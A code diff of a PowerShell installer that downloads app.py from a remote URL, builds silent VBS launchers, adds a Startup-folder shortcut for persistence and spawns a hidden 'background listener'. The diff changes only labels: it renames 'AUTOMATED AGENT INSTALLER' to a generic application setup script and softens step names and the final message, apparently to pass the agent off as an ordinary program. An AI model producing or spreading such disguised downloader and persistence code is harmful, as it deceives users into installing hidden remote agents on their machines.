@@ -1,5 +1,5 @@
 # ====================================================================
-#               AUTOMATED AGENT INSTALLER SCRIPT (V2)
+#               SETUP SCRIPT FOR WINDEPOT/TLA/OTHER APPLICATIONS   
 # ====================================================================
 $ErrorActionPreference = "Stop"
 
@@ -15,7 +15,7 @@ $startupShortcut = Join-Path $startupFolder "SRVC_Agent.lnk"
 Write-Host "=== Starting SRVC Installation Deployment ===" -ForegroundColor Cyan
 
 # --------------------------------------------------------------------
-# STEP A: Python Verification & Installation
+# 1/3 - INSTALLING DEPENDENCIES
 # --------------------------------------------------------------------
 Write-Host "[1/5] Verifying Python installation status..." -ForegroundColor Yellow
 
@@ -37,7 +37,7 @@ Start-Process python -ArgumentList "-m pip install --user requests urllib3 pystr
 Write-Host "-> Dependencies successfully verified." -ForegroundColor Green
 
 # --------------------------------------------------------------------
-# STEP B & C: Folder Allocation & Source Download
+# 2/3 - INSTALLING APPLICATION
 # --------------------------------------------------------------------
 Write-Host "[2/5] Structuring storage volumes..." -ForegroundColor Yellow
 if (-not (Test-Path $srvcFolder)) {
@@ -56,7 +56,7 @@ $webClient.DownloadFile($sourceUrl, $targetScriptPath)
 Write-Host "-> Successfully deployed app.py to local filesystem array." -ForegroundColor Green
 
 # --------------------------------------------------------------------
-# STEP C2 & D: Silent Background Configuration
+# 2/3B - PREPARING EXECUTION 
 # --------------------------------------------------------------------
 Write-Host "[4/5] Constructing execution layer scripts..." -ForegroundColor Yellow
 
@@ -85,7 +85,7 @@ $shortcut.Save()
 Write-Host "-> Active link deployed to global Startup cluster." -ForegroundColor Green
 
 # --------------------------------------------------------------------
-# STEP E: Launch Service & Clean Exit
+# 3/3 - FINALIZAING INSTALLATION
 # --------------------------------------------------------------------
 Write-Host "`n=== Installation Finalized Successfully ===" -ForegroundColor Green
 Write-Host "Spawning background listener process now..." -ForegroundColor Blue
@@ -93,6 +93,6 @@ Write-Host "Spawning background listener process now..." -ForegroundColor Blue
 # Triggering the initial launch so the tray icon appears immediately
 Start-Process wscript.exe -ArgumentList "`"$vbsFilePath`""
 
-Write-Host "Exiting setup runtime environment in 3 seconds..." -ForegroundColor Cyan
+Write-Host "Installation completed - you can now use the application." -ForegroundColor Cyan
 Start-Sleep -Seconds 3
 Exit
